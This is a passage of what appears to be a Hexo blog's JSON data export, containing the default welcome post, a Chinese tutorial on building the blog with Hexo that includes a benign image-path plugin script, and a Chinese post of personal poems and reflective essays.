href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><pre><code class=\"bash\">$ hexo new &quot;My New Post&quot;</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><pre><code class=\"bash\">$ hexo server</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><pre><code class=\"bash\">$ hexo generate</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><pre><code class=\"bash\">$ hexo deploy</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>Welcome to <a href=\"https://hexo.io/\" target=\"_blank\" rel=\"noopener\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\" target=\"_blank\" rel=\"noopener\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\" target=\"_blank\" rel=\"noopener\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\" target=\"_blank\" rel=\"noopener\">GitHub</a>.</p>\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><pre><code class=\"bash\">$ hexo new &quot;My New Post&quot;</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\" target=\"_blank\" rel=\"noopener\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><pre><code class=\"bash\">$ hexo server</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/server.html\" target=\"_blank\" rel=\"noopener\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><pre><code class=\"bash\">$ hexo generate</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\" target=\"_blank\" rel=\"noopener\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><pre><code class=\"bash\">$ hexo deploy</code></pre>\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\" target=\"_blank\" rel=\"noopener\">Deployment</a></p>\n"},{"title":"博客搭建以及编写","date":"2020-05-08T03:41:32.000Z","_content":"\n# 在本地写文章\n\n* 1:使用 vscode 打开 xinzhuzi.github.io\n* 2:终端打开, \n```\ncd xinzhuzi.github.io\n```\n* 3:开始写文章,\n```\nhexo new 文章名字\n```\n* 4:写完之后输入\n```\nhexo clean\nhexo g\n```\n* 5:使用 Github Desktop 上传到 GitHub 网站\n\n### 仓库地址\n* https://github.com/xinzhuzi/xinzhuzi.github.io\n* https://github.com/xinzhuzi/Record hexo 项目地址\n### 搭建博客\n* https://www.jianshu.com/p/83b3b7d4e649\n\n### 主题\n* https://github.com/xinzhuzi/hexo-theme-3-hexo\n\n### HEXO插入图片（详细版）\nhttps://www.jianshu.com/p/f72aaad7b852\n\n* 第一步：安装插件，在hexo根目录打开Git Bash,执行   \n\n```\n    npm install hexo-asset-image --save\n```\n\n* 第二步：打开hexo的配置文件_config.yml\n找到 post_asset_folder，把这个选项从false改成true\n* 第三步：打开\n/node_modules/hexo-asset-image/index.js\n将内容更换为下面的代码\n（在此感谢Ericam_ 大神：https://blog.csdn.net/xjm850552586）    \n\n\n```\n        'use strict';\n        var cheerio = require('cheerio');\n\n        // http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string        \n        function getPosition(str, m, i) {\n        return str.split(m, i).join(m).length;\n        }\n\n        var version = String(hexo.version).split('.');\n        hexo.extend.filter.register('after_post_render', function(data){\n        var config = hexo.config;\n        if(config.post_asset_folder){\n                var link = data.permalink;\n            if(version.length > 0 && Number(version[0]) == 3)\n            var beginPos = getPosition(link, '/', 1) + 1;\n            else\n            var beginPos = getPosition(link, '/', 3) + 1;\n            // In hexo 3.1.1, the permalink of \"about\" page is like \".../about/index.html\".     \n            var endPos = link.lastIndexOf('/') + 1;\n            link = link.substring(beginPos, endPos);\n\n            var toprocess = ['excerpt', 'more', 'content'];\n            for(var i = 0; i < toprocess.length; i++){\n            var key = toprocess[i];\n\n            var $ = cheerio.load(data[key], {\n                ignoreWhitespace: false,\n                xmlMode: false,\n                lowerCaseTags: false,\n                decodeEntities: false\n            });\n\n            $('img').each(function(){\n                if ($(this).attr('src')){\n                    // For windows style path, we replace '\\' to '/'.\n                    var src = $(this).attr('src').replace('\\\\', '/');\n                    if(!/http[s]*.*|\\/\\/.*/.test(src) &&\n                    !/^\\s*\\//.test(src)) {\n                    // For \"about\" page, the first part of \"src\" can't be removed.\n                    // In addition, to support multi-level local directory.\n                    var linkArray = link.split('/').filter(function(elem){\n                        return elem != '';\n                    });\n                    var srcArray = src.split('/').filter(function(elem){\n                        return elem != '' && elem != '.';\n                    });\n                    if(srcArray.length > 1)\n                        srcArray.shift();\n                    src = srcArray.join('/');\n                    $(this).attr('src', config.root + link + src);\n                    console.info&&console.info(\"update link as:-->\"+config.root + link + src);\n                    }\n                }else{\n                    console.info&&console.info(\"no src attr, skipped...\");\n                    console.info&&console.info($(this));\n                }\n            });\n            data[key] = $.html();\n            }\n        }\n        });         \n\n\n```\n\n\n\n* 第四步：现在就可以插入图片了，比如hexo new post photo之后\n就在source/_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，\n在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如\n\n```\n    ![这是代替图片的文字，随便写](head.jpeg)\n```\n然后就……完事了。\n参考链接：  \nhttps://blog.csdn.net/xjm850552586/article/details/84101345\nhttps://blog.csdn.net/qq_38148394/article/details/79997971\n","source":"_posts/博客搭建以及编写.md","raw":"---\ntitle: 博客搭建以及编写\ndate: 2020-05-08 11:41:32\ncategories:\n- 博客\ntags:\n- hexo\n---\n\n# 在本地写文章\n\n* 1:使用 vscode 打开 xinzhuzi.github.io\n* 2:终端打开, \n```\ncd xinzhuzi.github.io\n```\n* 3:开始写文章,\n```\nhexo new 文章名字\n```\n* 4:写完之后输入\n```\nhexo clean\nhexo g\n```\n* 5:使用 Github Desktop 上传到 GitHub 网站\n\n### 仓库地址\n* https://github.com/xinzhuzi/xinzhuzi.github.io\n* https://github.com/xinzhuzi/Record hexo 项目地址\n### 搭建博客\n* https://www.jianshu.com/p/83b3b7d4e649\n\n### 主题\n* https://github.com/xinzhuzi/hexo-theme-3-hexo\n\n### HEXO插入图片（详细版）\nhttps://www.jianshu.com/p/f72aaad7b852\n\n* 第一步：安装插件，在hexo根目录打开Git Bash,执行   \n\n```\n    npm install hexo-asset-image --save\n```\n\n* 第二步：打开hexo的配置文件_config.yml\n找到 post_asset_folder，把这个选项从false改成true\n* 第三步：打开\n/node_modules/hexo-asset-image/index.js\n将内容更换为下面的代码\n（在此感谢Ericam_ 大神：https://blog.csdn.net/xjm850552586）    \n\n\n```\n        'use strict';\n        var cheerio = require('cheerio');\n\n        // http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string        \n        function getPosition(str, m, i) {\n        return str.split(m, i).join(m).length;\n        }\n\n        var version = String(hexo.version).split('.');\n        hexo.extend.filter.register('after_post_render', function(data){\n        var config = hexo.config;\n        if(config.post_asset_folder){\n                var link = data.permalink;\n            if(version.length > 0 && Number(version[0]) == 3)\n            var beginPos = getPosition(link, '/', 1) + 1;\n            else\n            var beginPos = getPosition(link, '/', 3) + 1;\n            // In hexo 3.1.1, the permalink of \"about\" page is like \".../about/index.html\".     \n            var endPos = link.lastIndexOf('/') + 1;\n            link = link.substring(beginPos, endPos);\n\n            var toprocess = ['excerpt', 'more', 'content'];\n            for(var i = 0; i < toprocess.length; i++){\n            var key = toprocess[i];\n\n            var $ = cheerio.load(data[key], {\n                ignoreWhitespace: false,\n                xmlMode: false,\n                lowerCaseTags: false,\n                decodeEntities: false\n            });\n\n            $('img').each(function(){\n                if ($(this).attr('src')){\n                    // For windows style path, we replace '\\' to '/'.\n                    var src = $(this).attr('src').replace('\\\\', '/');\n                    if(!/http[s]*.*|\\/\\/.*/.test(src) &&\n                    !/^\\s*\\//.test(src)) {\n                    // For \"about\" page, the first part of \"src\" can't be removed.\n                    // In addition, to support multi-level local directory.\n                    var linkArray = link.split('/').filter(function(elem){\n                        return elem != '';\n                    });\n                    var srcArray = src.split('/').filter(function(elem){\n                        return elem != '' && elem != '.';\n                    });\n                    if(srcArray.length > 1)\n                        srcArray.shift();\n                    src = srcArray.join('/');\n                    $(this).attr('src', config.root + link + src);\n                    console.info&&console.info(\"update link as:-->\"+config.root + link + src);\n                    }\n                }else{\n                    console.info&&console.info(\"no src attr, skipped...\");\n                    console.info&&console.info($(this));\n                }\n            });\n            data[key] = $.html();\n            }\n        }\n        });         \n\n\n```\n\n\n\n* 第四步：现在就可以插入图片了，比如hexo new post photo之后\n就在source/_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，\n在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如\n\n```\n    ![这是代替图片的文字，随便写](head.jpeg)\n```\n然后就……完事了。\n参考链接：  \nhttps://blog.csdn.net/xjm850552586/article/details/84101345\nhttps://blog.csdn.net/qq_38148394/article/details/79997971\n","slug":"博客搭建以及编写","published":1,"updated":"2020-05-12T02:42:42.249Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8cwg00022gk742i942fh","content":"<h1 id=\"在本地写文章\"><a href=\"#在本地写文章\" class=\"headerlink\" title=\"在本地写文章\"></a>在本地写文章</h1><ul>\n<li>1:使用 vscode 打开 xinzhuzi.github.io</li>\n<li>2:终端打开, <pre><code>cd xinzhuzi.github.io</code></pre></li>\n<li>3:开始写文章,<pre><code>hexo new 文章名字</code></pre></li>\n<li>4:写完之后输入<pre><code>hexo clean\nhexo g</code></pre></li>\n<li>5:使用 Github Desktop 上传到 GitHub 网站</li>\n</ul>\n<h3 id=\"仓库地址\"><a href=\"#仓库地址\" class=\"headerlink\" title=\"仓库地址\"></a>仓库地址</h3><ul>\n<li><a href=\"https://github.com/xinzhuzi/xinzhuzi.github.io\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/xinzhuzi.github.io</a></li>\n<li><a href=\"https://github.com/xinzhuzi/Record\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/Record</a> hexo 项目地址<h3 id=\"搭建博客\"><a href=\"#搭建博客\" class=\"headerlink\" title=\"搭建博客\"></a>搭建博客</h3></li>\n<li><a href=\"https://www.jianshu.com/p/83b3b7d4e649\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/83b3b7d4e649</a></li>\n</ul>\n<h3 id=\"主题\"><a href=\"#主题\" class=\"headerlink\" title=\"主题\"></a>主题</h3><ul>\n<li><a href=\"https://github.com/xinzhuzi/hexo-theme-3-hexo\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/hexo-theme-3-hexo</a></li>\n</ul>\n<h3 id=\"HEXO插入图片（详细版）\"><a href=\"#HEXO插入图片（详细版）\" class=\"headerlink\" title=\"HEXO插入图片（详细版）\"></a>HEXO插入图片（详细版）</h3><p><a href=\"https://www.jianshu.com/p/f72aaad7b852\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/f72aaad7b852</a></p>\n<ul>\n<li>第一步：安装插件，在hexo根目录打开Git Bash,执行   </li>\n</ul>\n<pre><code>    npm install hexo-asset-image --save</code></pre><ul>\n<li>第二步：打开hexo的配置文件_config.yml<br>找到 post_asset_folder，把这个选项从false改成true</li>\n<li>第三步：打开<br>/node_modules/hexo-asset-image/index.js<br>将内容更换为下面的代码<br>（在此感谢Ericam_ 大神：<a href=\"https://blog.csdn.net/xjm850552586）\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/xjm850552586）</a>    </li>\n</ul>\n<pre><code>        &#39;use strict&#39;;\n        var cheerio = require(&#39;cheerio&#39;);\n\n        // http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string        \n        function getPosition(str, m, i) {\n        return str.split(m, i).join(m).length;\n        }\n\n        var version = String(hexo.version).split(&#39;.&#39;);\n        hexo.extend.filter.register(&#39;after_post_render&#39;, function(data){\n        var config = hexo.config;\n        if(config.post_asset_folder){\n                var link = data.permalink;\n            if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3)\n            var beginPos = getPosition(link, &#39;/&#39;, 1) + 1;\n            else\n            var beginPos = getPosition(link, &#39;/&#39;, 3) + 1;\n            // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.     \n            var endPos = link.lastIndexOf(&#39;/&#39;) + 1;\n            link = link.substring(beginPos, endPos);\n\n            var toprocess = [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];\n            for(var i = 0; i &lt; toprocess.length; i++){\n            var key = toprocess[i];\n\n            var $ = cheerio.load(data[key], {\n                ignoreWhitespace: false,\n                xmlMode: false,\n                lowerCaseTags: false,\n                decodeEntities: false\n            });\n\n            $(&#39;img&#39;).each(function(){\n                if ($(this).attr(&#39;src&#39;)){\n                    // For windows style path, we replace &#39;\\&#39; to &#39;/&#39;.\n                    var src = $(this).attr(&#39;src&#39;).replace(&#39;\\\\&#39;, &#39;/&#39;);\n                    if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp;\n                    !/^\\s*\\//.test(src)) {\n                    // For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.\n                    // In addition, to support multi-level local directory.\n                    var linkArray = link.split(&#39;/&#39;).filter(function(elem){\n                        return elem != &#39;&#39;;\n                    });\n                    var srcArray = src.split(&#39;/&#39;).filter(function(elem){\n                        return elem != &#39;&#39; &amp;&amp; elem != &#39;.&#39;;\n                    });\n                    if(srcArray.length &gt; 1)\n                        srcArray.shift();\n                    src = srcArray.join(&#39;/&#39;);\n                    $(this).attr(&#39;src&#39;, config.root + link + src);\n                    console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);\n                    }\n                }else{\n                    console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);\n                    console.info&amp;&amp;console.info($(this));\n                }\n            });\n            data[key] = $.html();\n            }\n        }\n        });         \n\n</code></pre><ul>\n<li>第四步：现在就可以插入图片了，比如hexo new post photo之后<br>就在source/_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，<br>在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如</li>\n</ul>\n<pre><code>    ![这是代替图片的文字，随便写](head.jpeg)</code></pre><p>然后就……完事了。<br>参考链接：<br><a href=\"https://blog.csdn.net/xjm850552586/article/details/84101345\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/xjm850552586/article/details/84101345</a><br><a href=\"https://blog.csdn.net/qq_38148394/article/details/79997971\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38148394/article/details/79997971</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"在本地写文章\"><a href=\"#在本地写文章\" class=\"headerlink\" title=\"在本地写文章\"></a>在本地写文章</h1><ul>\n<li>1:使用 vscode 打开 xinzhuzi.github.io</li>\n<li>2:终端打开, <pre><code>cd xinzhuzi.github.io</code></pre></li>\n<li>3:开始写文章,<pre><code>hexo new 文章名字</code></pre></li>\n<li>4:写完之后输入<pre><code>hexo clean\nhexo g</code></pre></li>\n<li>5:使用 Github Desktop 上传到 GitHub 网站</li>\n</ul>\n<h3 id=\"仓库地址\"><a href=\"#仓库地址\" class=\"headerlink\" title=\"仓库地址\"></a>仓库地址</h3><ul>\n<li><a href=\"https://github.com/xinzhuzi/xinzhuzi.github.io\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/xinzhuzi.github.io</a></li>\n<li><a href=\"https://github.com/xinzhuzi/Record\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/Record</a> hexo 项目地址<h3 id=\"搭建博客\"><a href=\"#搭建博客\" class=\"headerlink\" title=\"搭建博客\"></a>搭建博客</h3></li>\n<li><a href=\"https://www.jianshu.com/p/83b3b7d4e649\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/83b3b7d4e649</a></li>\n</ul>\n<h3 id=\"主题\"><a href=\"#主题\" class=\"headerlink\" title=\"主题\"></a>主题</h3><ul>\n<li><a href=\"https://github.com/xinzhuzi/hexo-theme-3-hexo\" target=\"_blank\" rel=\"noopener\">https://github.com/xinzhuzi/hexo-theme-3-hexo</a></li>\n</ul>\n<h3 id=\"HEXO插入图片（详细版）\"><a href=\"#HEXO插入图片（详细版）\" class=\"headerlink\" title=\"HEXO插入图片（详细版）\"></a>HEXO插入图片（详细版）</h3><p><a href=\"https://www.jianshu.com/p/f72aaad7b852\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/f72aaad7b852</a></p>\n<ul>\n<li>第一步：安装插件，在hexo根目录打开Git Bash,执行   </li>\n</ul>\n<pre><code>    npm install hexo-asset-image --save</code></pre><ul>\n<li>第二步：打开hexo的配置文件_config.yml<br>找到 post_asset_folder，把这个选项从false改成true</li>\n<li>第三步：打开<br>/node_modules/hexo-asset-image/index.js<br>将内容更换为下面的代码<br>（在此感谢Ericam_ 大神：<a href=\"https://blog.csdn.net/xjm850552586）\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/xjm850552586）</a>    </li>\n</ul>\n<pre><code>        &#39;use strict&#39;;\n        var cheerio = require(&#39;cheerio&#39;);\n\n        // http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string        \n        function getPosition(str, m, i) {\n        return str.split(m, i).join(m).length;\n        }\n\n        var version = String(hexo.version).split(&#39;.&#39;);\n        hexo.extend.filter.register(&#39;after_post_render&#39;, function(data){\n        var config = hexo.config;\n        if(config.post_asset_folder){\n                var link = data.permalink;\n            if(version.length &gt; 0 &amp;&amp; Number(version[0]) == 3)\n            var beginPos = getPosition(link, &#39;/&#39;, 1) + 1;\n            else\n            var beginPos = getPosition(link, &#39;/&#39;, 3) + 1;\n            // In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;.../about/index.html&quot;.     \n            var endPos = link.lastIndexOf(&#39;/&#39;) + 1;\n            link = link.substring(beginPos, endPos);\n\n            var toprocess = [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];\n            for(var i = 0; i &lt; toprocess.length; i++){\n            var key = toprocess[i];\n\n            var $ = cheerio.load(data[key], {\n                ignoreWhitespace: false,\n                xmlMode: false,\n                lowerCaseTags: false,\n                decodeEntities: false\n            });\n\n            $(&#39;img&#39;).each(function(){\n                if ($(this).attr(&#39;src&#39;)){\n                    // For windows style path, we replace &#39;\\&#39; to &#39;/&#39;.\n                    var src = $(this).attr(&#39;src&#39;).replace(&#39;\\\\&#39;, &#39;/&#39;);\n                    if(!/http[s]*.*|\\/\\/.*/.test(src) &amp;&amp;\n                    !/^\\s*\\//.test(src)) {\n                    // For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.\n                    // In addition, to support multi-level local directory.\n                    var linkArray = link.split(&#39;/&#39;).filter(function(elem){\n                        return elem != &#39;&#39;;\n                    });\n                    var srcArray = src.split(&#39;/&#39;).filter(function(elem){\n                        return elem != &#39;&#39; &amp;&amp; elem != &#39;.&#39;;\n                    });\n                    if(srcArray.length &gt; 1)\n                        srcArray.shift();\n                    src = srcArray.join(&#39;/&#39;);\n                    $(this).attr(&#39;src&#39;, config.root + link + src);\n                    console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);\n                    }\n                }else{\n                    console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);\n                    console.info&amp;&amp;console.info($(this));\n                }\n            });\n            data[key] = $.html();\n            }\n        }\n        });         \n\n</code></pre><ul>\n<li>第四步：现在就可以插入图片了，比如hexo new post photo之后<br>就在source/_posts生成photo.md文件和photo文件夹，我们把要插入的图片复制到photo文件夹内，<br>在photo.md文件里面按markdown的标准写,（我的文件名是head.jpeg）比如</li>\n</ul>\n<pre><code>    ![这是代替图片的文字，随便写](head.jpeg)</code></pre><p>然后就……完事了。<br>参考链接：<br><a href=\"https://blog.csdn.net/xjm850552586/article/details/84101345\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/xjm850552586/article/details/84101345</a><br><a href=\"https://blog.csdn.net/qq_38148394/article/details/79997971\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/qq_38148394/article/details/79997971</a></p>\n"},{"title":"诗词随笔","date":"2020-05-10T03:41:32.000Z","_content":"\n# 游戏日随笔\n我就像一个赌徒,拿着全部身家在游戏的桌子上面疯狂投掷.\n每当输掉一次,就重新撕开一次伤口,并在上面洒满了盐巴,当你看到我满身的伤痕,\n不要害怕,不要惊讶,也不要看不起,这是活着的证明,也是不以他人意志为转移的信仰.\n这场疯狂的赌博,没有人可以全身而退,只能不断榨干自身的鲜血,学识,修养,器官以及决绝意志.\n死亡亦不可超脱,唯有爱在赌博中扎根深种.才可以实现升华.\n爱你,爱世人,你是唯一的,世人是涩苦的,都需要爱来兼容.\n是谁繁华了你的寂寞 2020-09-13\n\n\n# 海日阵\n仙山白底黑为顶，万军冲杀云做盘。\n海连天日我为客，墨染春秋点点杀。\n\n\n# 情人节快乐\n我与秋风皆过客，你携春水揽星河。\n我有岁月可回首，你以深情赴白头。\n我生有幸遇见你，你许一人尽偏爱。\n我有诗酒三十六，你爱美人渐无书。\n我问归期几多时，你却君王不早朝。\n我执玲珑安红豆，你说无关风与月。\n我要人生如初见，你送悲扇事秋风。\n我在去年今日时，你捻桃花手折枝。\n\n送给你们朋友圈秀恩爱的。\n祝你们白头偕老，寿比南山。\n\n\n# 深夜\n盼夜归星辰，知晨曦日耀。\n\n# 路\n刀不断是非，剑难解一仇。\n弃刀绝剑去，杨柳草依依。\n\n# 路\n何处是归途，证我大名道。\n红尘纷乱乱，到底意难平。\n\n# 愁\n又几多愁，旧日春光洒满头。\n满城悲絮，一口浊气牵肠去。\n\n# 深夜\n星河旧冷夜成眠，月殿回暖梦无时。\n啼喃起伏阵阵音，淡落霜打枯枯意。\n\n# 秋知佛\n千灯湖塔亮人家，西樵百步承风雨。\n祖庭怒火显武世，中南海里演国仇\n\n# 明志\n誓要乾坤清，付予天地明。\n纵有千百恨，不惧万世冤。\n\n# 上班去\n蓝甲战衣穿胸膛，风雨雷电伴耳旁。\n朝圣路上多诘难，不觉已到昆仑虚。\n\n# 好走\n事别经年，我该如何称呼你的青春，是献给了理想，还是献祭了理想？\n\n# 好走\n轻风细雨，杂音喧闹，满身泥泞的少年，无人问津的路！\n# 愧然也\n半月封尘半月圆，清风协隐清风喧。\n藏月愧日量归期，自咏半月还锦瑟。\n\n\n# 深夜\n吾夜观星象，必当亡于辰时三刻。\n当神游物外，飞天巡视列御四方。\n# 成功的方法只有一个,就是以你喜欢的方式活下去\n坚信无论经过多少黑暗与苦难，那传说了无数次，忽悠了无数回，却始终未见的太平盛世，终会到来。\n--魏忠贤时代。\n\n\n# 你的BGM\n青云天上敬豪客，话聊红尘琴一曲。\n日月星辰路上人，悠扬大风歌一首。\n\n\n# 生来悲徨\n心中一片悲凉意，化作此刻剑来时。\n持剑纵横捭阖家，难敌千夫幻心指。\n\n\n# 感\n人从悲哀中落落大方走出来\n就是艺术家\n\n# 金帛春日远游记.\n\n与友别赠青云.至真情且意坚.\n常思决绝不下,神游天寻古月.\n念念欲归未得,悔与不深之言.\n有前程可奔赴,有岁月可回首.\n# 再遇\n\n愿你自再遇见，无波澜，问安如友。\n# 论韭菜\n我向左边看是七暗公主，我向右边看是佳俏'公子'。用色彩勾勒的七彩祥云，加了一勺暗元素，还有一个缺失的人格，这是一个完美状态。用波澜不惊的态度，遮盖讶疑的双眼，又是上扬的嘴角，仿佛看了透少年的拘谨。这些事情，请孩子们啊尽早体会，若是到了索然无味的阶段，心率会一直保持在50下，这才是真正的死了，我问一句，你死了吗？你默不作声，不敢相信自己死了似的，承认它又太难了，就这样不上不下的做根韭菜，又有什么不好。谁能回答呢？\n\n\n\n# 感\n春雨    催    眠人，樱花     打    诗雨。\n青峰    惘    然已，天桥     过    路己。\n\n\n# 感\n\n又是春一季，风与花不同。孤独又上了一层楼，交流的成本竟然花掉了我的三块竹子，原以为包容是可以解决一切问题的，后来发现，还是俗入人心，骚人与自由才是完美的一对，那堪堪的能让自己悲伤呢。每夜一丝尘，腐腐眼眸里。金时烟花放，寄入浮光里！\n\n我会忘了与你的一切！\n\n# 情\n弯眉掷枪手执箭，寒风不挡霓裳舞。百战金装身上衣，别有一番英武气！\n\n认识一妹子,因其特殊经历,好久想给其作诗,但一直无缘灵感.今一朝闻面,10分钟内做出一首打油诗.做的不好,讨大家个乐,小年吉祥.也祝你新的一年事事顺心!\n\n# 乐\n文墨我所忆，才女我所追。窈窕我所赏，一生我所执。\n\n# 只如初见\n纤弱细骨，柔英无眉，以淡淡热香之力，使人不敢妄动。惟只按下躁动之心，以求诸佛佑我行！轻嘤袅袅，婷婷扑面，左右似是仙鹤隐空，虚中望人定身。仙女下凡不外如是，尝过人间百事，更有一丝韵殇其中。醉不可收，溺惘在深谭。\n\n# 佳句\n春寒料峭深深绿，姹紫嫣红百样好！\n\n\n\n天空之城初相识，恨晚晴霞彩云追。\n\n# 心境之路\n在这繁华的盛世里，逐利，是我对自己画的圈，一辈子还逃的开吗？剑胆破晓时刻，在求剑船上已注定，不近！伸着脸喝着红酒，暗想还有哪一计可以让我走的更顺心，想到最后，一句随心。是谁繁华了你的寂寞-第三章第10节\n\n# 思国\n深夜识鬼忘川雨，撩动人心古琴音。\n\n百年一梦鼓浪屿，至今思迁一海峡！\n\n# 暖\n禾木剜心红耳汤，前世茫茫不思量。暖人暖世煖春风，相知相伴香一生！\n\n\n\n# 一次失恋\n夏初，是悲伤的开始，刚刚孕育的花朵，经不起暴晒，退缩成为了我的常态，没有茁壮的枝干，又怎能生出依偎来？是我不好，没有让你快乐的勇气，一切的道歉都像是在对自己诉说。余生的红色都给了这些时光，再也不会有咸涩滴落！\n\n# 三句情诗\n\n深夜\n\n想你和梦\n\n都开始了\n\n# 深爱\n爱的那么深刻，又几遇能相释怀，倾尽所有告诉你的眼睛，我的味道与你相融。彼此纠缠不管是相克犯煞，还是怨恨有憎，都逃不开内心的焦灼。与你以礼相敬，即隔山海，也爱你之所爱，亲你之所亲。﻿\n\n我愿与你桃花三千时相伴，更白守少年誓言。\n\n\n\n# 2017初雪\n深夜下雪，思故人。归来归来，仍落地不见，我思念你，思念你如雪默，寂静无声，冷彻寒骨。再见你，白雪送佳人，萧瑟独行客。\n\n# 归来\n尘埃浮现，镜台亦拂拭轻吟。良月当空，往事都随风过处。饭香浓思，深潭有雾气缭绕。八齿齐放，脸颊也鱼尾三重。十年啄灼，栖息好静安书斋。残棋四九，缺一是生离死别。千里不息，天河游鱼龙豚舞。百世聚仁，情且行德怨恩仇。\n\n\n# 是谁繁华了我的寂寞 2017.11.7\n\n思绪混乱,各种负面情绪:语点的反应(我说出每句话的中心意思),丑陋的外表,邋遢的气息,颓废的心里,蠢弱的身体,活不到的快乐,得不到的尊重,歇斯底里的嘲讽.各种各样的交织,像黑暗一样吞噬着我.\n\n每一个小时我都会有,就这样活着有什么意思,这样的想法,剩下的59分59秒,我都在去努力改变一下.记录一下,虽然转瞬即逝.很现实,很悲哀.\n\n都在妄想不劳而获,都在想当一只蛀虫.心底里的想法,毫不犹豫的展现出来,仅仅伤害了别人吗?是否考虑过谁在背负着这些因果,谁在地狱里被红莲业火燃烧焦灼,谁在承受人情的无穷纠葛.\n\n浮夸的表演,不得不让我把你想得丑陋一些.造作的语句,冷漠的表情,都是对这个世界有情的伤害.\n\n就这样吧,就这样吧,我总是安于现状,不思改变,不求理解.\n\n秋雨  ∙  心安!\n\n# 是谁繁华了你的寂寞-第三章第一节\n我的坚持得到过所有人的\"背叛\"，我所坚持下去的勇气，是无人可阻的！我可以抛弃所有的荣华富贵和身康体健，但我唯独不可以抛弃这股来自灵魂的信仰！自成以来，赶走无为，摘掉庸碌，救赎自我。世界与我再无敌意！\n\n# 